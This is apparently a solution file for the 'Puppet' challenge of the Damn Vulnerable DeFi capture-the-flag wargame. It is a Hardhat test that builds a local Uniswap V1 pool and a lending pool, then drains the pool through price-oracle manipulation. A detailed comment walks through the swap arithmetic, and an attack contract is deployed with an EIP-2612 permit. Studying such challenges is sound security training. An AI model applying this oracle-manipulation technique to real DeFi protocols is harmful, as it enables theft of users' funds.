const exchangeJson = require("../../build-uniswap-v1/UniswapV1Exchange.json");
const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
const { signERC2612Permit } = require("eth-permit");
const { utils } = require("ethers");

// Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
    return (tokensSold * 997n * etherInReserve) / (tokensInReserve * 1000n + tokensSold * 997n);
}

describe('[Challenge] Puppet', function () {
    let deployer, player;
    let token, exchangeTemplate, uniswapFactory, uniswapExchange, lendingPool;

    const UNISWAP_INITIAL_TOKEN_RESERVE = 10n * 10n ** 18n;
    const UNISWAP_INITIAL_ETH_RESERVE = 10n * 10n ** 18n;

    const PLAYER_INITIAL_TOKEN_BALANCE = 1000n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 25n * 10n ** 18n;

    const POOL_INITIAL_TOKEN_BALANCE = 100000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
        [deployer, player] = await ethers.getSigners();

        const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer);
        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.evm.bytecode, deployer);
        
        setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);

        // Deploy token to be traded in Uniswap
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy a exchange that will be used as the factory template
        exchangeTemplate = await UniswapExchangeFactory.deploy();

        // Deploy factory, initializing it with the address of the template exchange
        uniswapFactory = await UniswapFactoryFactory.deploy();
        await uniswapFactory.initializeFactory(exchangeTemplate.address);

        // Create a new exchange for the token, and retrieve the deployed exchange's address
        let tx = await uniswapFactory.createExchange(token.address, { gasLimit: 1e6 });
        const { events } = await tx.wait();
        uniswapExchange = await UniswapExchangeFactory.attach(events[0].args.exchange);

        // Deploy the lending pool
        lendingPool = await (await ethers.getContractFactory('PuppetPool', deployer)).deploy(
            token.address,
            uniswapExchange.address
        );

        // Add initial token and ETH liquidity to the pool
        await token.approve(
            uniswapExchange.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await uniswapExchange.addLiquidity(
            0,                                                          // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            (await ethers.provider.getBlock('latest')).timestamp * 2, // deadline
            {
                value: UNISWAP_INITIAL_ETH_RESERVE,
                gasLimit: 1e6
            }
        );

        // Ensure Uniswap exchange is working as expected
        expect(
            await uniswapExchange.getTokenToEthInputPrice(
                10n ** 18n,
                { gasLimit: 1e6 }
            )
        ).to.be.eq(
            calculateTokenToEthInputPrice(
                10n ** 18n,
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )
        );
        
        // Setup initial token balances of pool and player accounts
        await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE);
        await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
        expect(
            await lendingPool.calculateDepositRequired(10n ** 18n)
        ).to.be.eq(2n * 10n ** 18n);

        expect(
            await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE * 2n);
    });

    /**
     * @dev
     * Exploit Overview:
     * 
     * This exploit introduces the idea of uniswap liquidity pools and how to manipulate them.
     * 
     * Initially to borrow all tokens from the lending pool (100000 DVT) we would need twice the 
     * amount of equivalent VALUE in ETH. The value is calcluated as the ratio between the two assets
     * so initially as they have the same ratio it would cost 200000 ETH.
     * 
     * The liquidity pool has a balance of 10 ETH : 10 DVT. Since we have a lot more DVT and ETH
     * than the pool, we can manipulate the liquididty pools price ratio, since liquidity pools
     * are meant to have 50:50 eq value of both tokens.
     * 
     * Liquidity Pools swaps are calculated AFTER the deposit so after depositing our 1000 DVT
     * the ratio becomes 10 ETH : 1010 DVT. since we contributed > 99% of the tokens on the right
     * we are entitled to > 99% of the tokens of the ETH which is just under 10 ETH. 
     *  Which then results in a price ratio of 0.01 ETH ~: 1010 DVT. Essentially heavily
     *  devaluing the DVT in relation to ETH.
     * 
     * It is calculated as follows (not accounting for the 0.3% fee)
     * https://github.com/Uniswap/v1-contracts/blob/c10c08d81d6114f694baa8bd32f555a40f6264da/contracts/uniswap_exchange.vy#L437
     * 
     * num = DEPOSITED_TOKENS * ETH_RESERVE
     * den = TOTAL_TOKENS + DEPOSITED_TOKENS
     * 
     * num = 1000 DVT * 10 ETH
     * den = 10 DVT + 1000 DVT
     * ouput ~= 9.9009.. ETH
     * 
     * 1 DVT ~= (0.09 / 1010) ETH 
     * 
     * The oracle for the price will then equate borrowing the entire lending pools funds 
     * of 100000 DVT for:
     * 
     * 100000 DVT ~= (0.09 / 1010) * 100000 * 2
     * 
     * Which comes out to be just under 20ETH which we have!
     * 
     * So we then request the loan from the lending pool to borrow all DVT for 20ETH
     * which leaves us with 
     * 
     * Attacker ETH: 25 + 9.9 ETH (from deposited 1000 DVT) - ~20ETH (to borrow DVT) = ~15 ETH 
     * Attacker DVT: 100000 
     * 
     * So then to put the liquidity pool back to its original ratio so we can deposit 
     * enough ETH to get the original 1000 DVT back which turns out to be ~10 ETH again.
     * This time we calculate the ratio post withdraw first. So:
     * 
     * 0.09 ETH : 10 DVT (post withdraw)
     * 
     * 1 DVT ~= 0.009 ETH 
     * 1000 DVT ~= 9 ETH
     * 
     * Therefore we pay the remaing ~10ETH to retrive the 1000 DVT which returns the uniswap pool back to 
     * 10 ETH ~: 10 DVT
     * 
     * Finishing our attack with 
     * 5 ETH
     * 100010 DVT
     * 
     * and assuming the liquidity pools initial value of 50:50 is correct then our total value position has increased
     * from 
     * INITAL VALUE = 25 + 1000 = 1025 
     * to
     * FINAL_VALUE = 5 + 100010 = 100015
     * 
     * Meaning we incrased our position ~97x
     * 
     *  V3 Update:
     *  The new requirements of this challenge to be completed in 1 transaction meant that I transfered all the logic
     *  to a new attack contract called [AttackPuppet.sol]. Everything is more or less the same except since
     *  you need to transfer both ETH and DVT to the contract at deployment you need to create a EIP-2612 signature
     *  to allow for ERC20 transfers with just a signature instead of a seperate transaction. Everything else is the 
     *  sam except now it's coded in solidity :)
     * 
     */
    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */

        // Connect to the contracts with the attackers wallet
        const attackPool = lendingPool.connect(player);
        const attackToken = token.connect(player);
        const attackUniSwap = uniswapExchange.connect(player);

        // Helper function to get current token/eth balances
        const logAttackerBalances = async (address, name) => {
            const ethBal = await ethers.provider.getBalance(address);
            const tokenBal = await attackToken.balanceOf(address);

            console.log(`ETH Balance of ${name}:`, ethers.utils.formatEther(ethBal));
            console.log(`TKN Balance of ${name}:`, ethers.utils.formatEther(tokenBal));
            console.log("")
        }

        await logAttackerBalances(player.address, "attacker");
        await logAttackerBalances(attackUniSwap.address, "uniswap");
        
        // Calculate contract address to generate signature
        const contractAddr = ethers.utils.getContractAddress({
            from: player.address,
            nonce: await player.getTransactionCount()
        });
        // Sign permit
        const result = await signERC2612Permit(
            player,
            attackToken.address,
            player.address,
            contractAddr,
            PLAYER_INITIAL_TOKEN_BALANCE)


        console.log("Deploying attacking contract");
        const AttackPuppetFactory = await ethers.getContractFactory("AttackPuppet", player);
        await AttackPuppetFactory.deploy(
            PLAYER_INITIAL_TOKEN_BALANCE,
            POOL_INITIAL_TOKEN_BALANCE,
            result.deadline,
            result.v,
            result.r,
            result.s,
            attackUniSwap.address,
            attackToken.address,
            attackPool.address,
            {
                gasLimit: 1e7,
                value:  utils.parseEther("24")
            }
        )

        await logAttackerBalances(player.address, "Player")
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        // Player executed a single transaction
        expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);
        
        // Player has taken all tokens from the pool       
        expect(
            await token.balanceOf(lendingPool.address)
        ).to.be.eq(0, 'Pool still has tokens');

        expect(
            await token.balanceOf(player.address)
        ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE, 'Not enough token balance in player');
    });
});